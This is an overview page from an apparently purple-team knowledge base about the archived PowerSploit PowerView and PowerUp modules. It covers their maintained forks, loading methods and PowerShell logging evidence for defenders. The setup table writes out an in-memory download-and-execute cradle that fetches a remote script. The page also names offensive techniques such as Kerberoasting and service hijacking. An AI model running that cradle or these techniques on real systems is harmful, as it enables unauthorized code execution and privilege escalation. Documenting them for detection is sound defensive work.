# PowerSploit — Overview

The root page for the `PowerSploit/` tool folder. "PowerSploit" was originally a single umbrella project bundling several independent PowerShell offensive modules; this folder covers the two SEC560-index-listed members of that project — **PowerView** (AD enumeration) and **PowerUp** (Windows local privilege-escalation enumeration/abuse). This page stays shallow by design — go to a sub-tool's own `01 - Overview.md` for its Red Flag Principle, verified function reference, and full evidence chain.

## Contents
- [What PowerSploit Was — and What's Actually Current Now](#what-powersploit-was--and-whats-actually-current-now)
- [Install & Setup](#install--setup)
- [Shared PowerShell-Tradecraft Mechanics](#shared-powershell-tradecraft-mechanics)
- [Sub-Tool Table of Contents](#sub-tool-table-of-contents)

---

## What PowerSploit Was — and What's Actually Current Now

**`PowerShellMafia/PowerSploit`** was a modular PowerShell post-exploitation framework — Recon (PowerView), Privesc (PowerUp), CodeExecution, Exfiltration, Persistence, AntivirusBypass, and more, each a standalone `.ps1` a user could load independently. Primary author of the two modules this folder covers: **Will Schroeder (`@harmj0y`)**. License: BSD 3-Clause.

**Verified live (2026-08-04): the repository is archived.** `GET /repos/PowerShellMafia/PowerSploit` returns `"archived": true`; the last real commit landed **2020-08-17**, and both the `master` and `dev` branches are byte-identical (no unreleased newer state sitting on `dev`). Neither `PowerView.ps1` nor `PowerUp.ps1` has been functionally touched since **2018-07-02** — development on both had effectively stopped years before the formal archive.

**There is no single "PowerSploit lives on here" answer — and the two modules diverged in opposite directions from the same archived source, verified live and worth stating plainly rather than picking one narrative to fit both:**

| Module | Actively-maintained copy found | Direction of divergence |
|---|---|---|
| **PowerView** | Embedded in `BC-SECURITY/Empire`'s module source (no standalone repo exists) | **Ahead** of the archived original — 124 functions vs. 101, last touched April 2026, with real new capability (ADCS/RBCD/DCSync-rights/LAPS-reader checks, built-in query obfuscation) the archived source never had |
| **PowerUp** | Also embedded in `BC-SECURITY/Empire`'s module source | **Behind** the archived original — a pre-2016-rename snapshot (4,013 lines, `Invoke-AllChecks` as a literal function rather than the archived source's `Invoke-PrivescAudit` + alias), vendored in once (Feb 2021) and never resynced |

Each sub-tool's own `01 - Overview.md` documents this in full, including exactly which function names differ between the two states — this page states the finding once and doesn't repeat the function-by-function detail.

**Neither module has a maintained, standalone GitHub repository of its own as of this writing.** An operator or analyst asking "where do I get the current PowerView/PowerUp" has to know to look inside Empire's source tree specifically — there is no `github.com/<org>/PowerView` or `github.com/<org>/PowerUp` project actively shipping either script independently. Both sub-tool pages flag their own successor/adjacent-project landscape too: PowerView has a from-scratch, actively-maintained Python reimplementation (`aniqfakhrul/powerview.py`); PowerUp sits alongside a broader, more actively-developed enumeration script (`itm4n`'s `PrivescCheck.ps1`) in Empire's own bundled `privesc/` directory, and has a compiled C# successor (`SharpUp`, in the same GhostPack author family as Seatbelt/Rubeus — `Purple Teaming/GhostPack/`, Wave 3, not yet built at time of writing).

## Install & Setup

There is no installer — both are single `.ps1` files, loaded into an already-running PowerShell session by one of three methods, each with a materially different evidence footprint (documented in depth in each sub-tool's `03 - Source Evidence.md`):

| Method | Disk footprint |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://.../PowerView.ps1')` — in-memory download cradle | None |
| `Import-Module .\PowerUp.ps1` / dot-source (`. .\PowerUp.ps1`) from a locally-staged copy | A `.ps1` file on disk, however briefly |
| Reflectively loaded through a C2 framework's own PowerShell-execution primitive (Empire's PowerShell agent, Cobalt Strike's `powerpick`, Sliver's `execute-assembly`-adjacent loaders) | Framework-dependent — see that framework's own pages |

Both scripts are pulled from whichever source is being used (the archived PowerShellMafia repo, or extracted from Empire's bundled module source) and staged for delivery — there's no build step, no dependency install, no compiled artifact to manage.

## Shared PowerShell-Tradecraft Mechanics

Both modules are ordinary PowerShell function libraries with no compiled component, which means they share the exact evidentiary foundation documented once, in depth, in `Purple Teaming/LOLBins/powershell/04 - Target Evidence.md` — neither sub-tool page re-derives it:

- **Script Block Logging (4104) and Module Logging (4103) are off by default.** On an unconfigured estate, the only reliably-present PowerShell-engine-level evidence for either module running is Event 400 on the classic "Windows PowerShell" channel (on by default, captures the invoking command line but not the function-level detail of what ran afterward).
- **A narrow, always-on Warning-level 4104 exception** fires for a hardcoded suspicious-strings list even with logging never explicitly enabled — both sub-tool pages note that PowerUp's heavier use of the reflective `Add-Win32Type`/`DllImport` P/Invoke pattern (for Win32 API access) makes it more likely to trip this heuristic than PowerView's largely ADSI/LDAP-only code.
- **AMSI applies identically to both** — a successful upstream AMSI bypass removes AV/EDR content-inspection visibility into either script but has no documented effect on 4103/4104.
- **`pwsh.exe` (PowerShell 7) logs to a separate `PowerShellCore/Operational` channel** that must be manually registered — a hunt scoped only to the classic `Microsoft-Windows-PowerShell/Operational` channel misses either module entirely if run under `pwsh.exe`.
- **Reflective/in-memory loading is the norm for both**, not the exception — real-world usage skews heavily toward a download-cradle-into-memory pattern for both modules, meaning the "no PowerUp/PowerView file ever touches disk" case is the one an analyst should plan around first, not the exception.

Where the two modules structurally differ: **PowerView is a remote-enumeration tool** (source host querying a DC/member computers over the network — LDAP, SAMR, Kerberos), while **PowerUp is purely local** (verified live — no function in the source accepts a remote-target parameter). That single distinction is why PowerView's Source/Target Evidence pages describe two different hosts and PowerUp's describe the same host twice from different angles (live/volatile view vs. post-hoc disk/registry/event-log view) — each sub-tool's own `03`/`04` pages state this explicitly rather than forcing an identical structure across both.

**Relationship to already-built AD-enumeration content.** PowerView's domain/trust/group/ACL enumeration functions cover much of the same ground `Purple Teaming/BloodHound/` covers at scale — `PowerView/02 - Hands-On Use Cases.md` addresses this directly rather than re-deriving BloodHound's graph-theory material: PowerView answers enumeration questions one text query at a time and prints results; BloodHound (via SharpHound) collects the same underlying data alongside every other edge type and renders it as a persistent, queryable graph. An analyst who finds PowerView traffic should not assume a graph exists; an analyst who finds SharpHound traffic should assume one likely does (or soon will). Kerberoasting via `Invoke-Kerberoast` and DCSync-rights checks via the fork-only `Get-DomainDCSync` both cross-link into `Purple Teaming/Impacket/GetUserSPNs (Kerberoasting)/`, `Purple Teaming/Mimikatz/kerberos (Golden-Silver Ticket)/`, and `Purple Teaming/Mimikatz/lsadump (DCSync)/` rather than re-deriving their KDC/DRSUAPI mechanics. PowerUp's service-abuse primitives share the identical `ChangeServiceConfig` SCM API — and the identical reconfigure-vs-create event-logging gap — already documented in `Purple Teaming/LOLBins/sc/`, cross-linked rather than repeated.

## Sub-Tool Table of Contents

| Sub-Tool | Covers |
|---|---|
| [`PowerView/`](PowerView/01%20-%20Overview.md) | AD enumeration — domain/user/computer/group/trust discovery, ACL abuse (read and, where rights allow, write), GPO enumeration, fleet-wide local-admin/session hunting, Kerberoasting via `Invoke-Kerberoast`, and the BC-SECURITY-fork-only ADCS/RBCD/DCSync-rights/LAPS-reader/query-obfuscation additions absent from the archived original |
| [`PowerUp/`](PowerUp/01%20-%20Overview.md) | Windows local privilege-escalation enumeration and abuse — service misconfigurations (unquoted paths, weak ACLs, `binPath` hijack via direct `ChangeServiceConfig` P/Invoke, no `sc.exe` child process), DLL hijacking, `AlwaysInstallElevated`, scheduled-task/autorun/GPP/registry credential harvesting, and the hardcoded pre-compiled payload template that makes this module's dropped binaries hash-matchable across every deployment |

Every sub-tool page shares the PowerShell-logging-subsystem mechanics documented above and in `LOLBins/powershell/04 - Target Evidence.md` — neither re-derives it.
